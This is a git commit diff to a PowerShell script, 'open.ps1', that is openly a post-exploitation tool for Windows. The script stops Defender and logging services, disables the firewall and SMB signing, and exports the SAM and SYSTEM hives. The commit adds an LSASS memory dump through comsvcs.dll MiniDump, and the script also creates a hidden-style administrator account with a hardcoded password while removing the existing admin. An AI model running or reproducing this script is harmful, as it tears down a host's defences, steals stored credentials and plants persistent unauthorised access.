ba023db846b244a5dc733c010e5b1e7a0ed5ed50
stefanos007 <omgandthreelols@gmail.com>
2024-04-04 12:53:43 +0300

    Update open.ps1

--- open.ps1
+++ open.ps1
@@ -1,3 +1,6 @@
+$id=(Get-Process -Name "lsass").id
+$pwd=ConvertTo-SecureString -String "Temp@123" -AsPlainText -Force
+
 Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
 Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
 Stop-Process -Name "MsMpEng" -Force -ErrorAction Ignore
@@ -5,17 +8,21 @@ Stop-Service -Name "mpssvc" -Force -ErrorAction Ignore
 Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
 Stop-Service -Name "WinCollect" -Force -ErrorAction Ignore
 Stop-Service -Name "WinDefend" -Force -ErrorAction Ignore
-Stop-Service "W3SVC" -Force -ErrorAction Ignore
+Stop-Service -Name "W3SVC" -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
 Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
 Set-MpPreference -DisableRealtimeMonitoring $true
 #Stop-IISSite -Name "Default Web Site"
-Invoke-Command  {reg export 'HKLM\SAM' C:\sam.reg}
 
+Set-Service -Name "WinCollect" -StartupType Disabled
+Set-Service -Name "W3SVC" -StartupType Disabled
 
-$pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
+Invoke-Command {reg export 'HKLM\SAM' C:\sam.reg}
+Invoke-Command {reg export 'HKLM\SYSTEM' C:\system.reg}
+Invoke-Command {rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id C:\lsass.dmp full}
+
 New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires -Description "C0MPR0M1ZED" -Password $pwd -PasswordNeverExpires -UserMayNotChangePassword
 Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
 Remove-LocalGroupMember -Group "Administrators" -Member "algo"
